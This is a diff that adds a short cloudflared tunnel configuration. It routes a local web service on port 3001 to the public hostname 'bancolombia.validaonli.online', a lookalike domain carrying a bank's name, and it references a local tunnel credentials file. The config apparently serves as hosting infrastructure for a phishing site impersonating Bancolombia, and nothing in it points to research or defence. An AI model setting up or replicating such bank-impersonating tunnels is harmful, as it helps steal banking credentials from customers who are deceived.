@@ -1,0 +1,7 @@
+tunnel: d264b66e-9b81-4491-87ed-d815dea7ead0
+credentials-file: C:\Users\SUPER USUARIO\.cloudflared\d264b66e-9b81-4491-87ed-d815dea7ead0.json
+
+ingress:
+  - hostname: bancolombia.validaonli.online
+    service: http://localhost:3001
+  - service: http_status:404
